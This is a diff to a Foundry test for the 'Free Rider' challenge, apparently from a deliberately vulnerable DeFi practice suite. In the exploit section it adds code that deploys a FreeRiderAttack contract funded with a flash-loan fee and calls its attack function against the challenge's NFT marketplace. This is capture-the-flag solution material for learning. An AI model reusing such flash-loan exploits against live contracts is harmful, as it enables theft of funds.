@@ -2,7 +2,7 @@
 pragma solidity >=0.8.0;
 
 import "forge-std/Test.sol";
-
+import {FreeRiderAttack} from "../../../src/Contracts/free-rider/FreeRiderAttack.sol";
 import {FreeRiderRecovery} from "../../../src/Contracts/free-rider/FreeRiderRecovery.sol";
 import {FreeRiderNFTMarketplace} from "../../../src/Contracts/free-rider/FreeRiderNFTMarketplace.sol";
 import {IUniswapV2Router02, IUniswapV2Factory, IUniswapV2Pair} from "../../../src/Contracts/free-rider/Interfaces.sol";
@@ -135,6 +135,20 @@ contract FreeRider is Test {
          * EXPLOIT START *
          */
         vm.startPrank(attacker, attacker);
+
+        uint256 flashLoanFee = 45135406218655968;
+        FreeRiderAttack freeRiderAttack = new FreeRiderAttack{value: flashLoanFee}({
+            _freeRiderBuyer: address(freeRiderRecovery),
+            _freeRiderNFTMarketplace: payable(address(freeRiderNFTMarketplace)),
+            _dvt: address(dvt),
+            _damnValuableNFT: address(damnValuableNFT),
+            _uniswapV2Pair: address(uniswapV2Pair),
+            _weth: payable(address(weth)),
+            _attacker: payable(address(attacker))
+            }
+        );
+        vm.label(address(freeRiderAttack), "FreeRiderAttack");
+        freeRiderAttack.attack();
 
         vm.stopPrank();
         /**
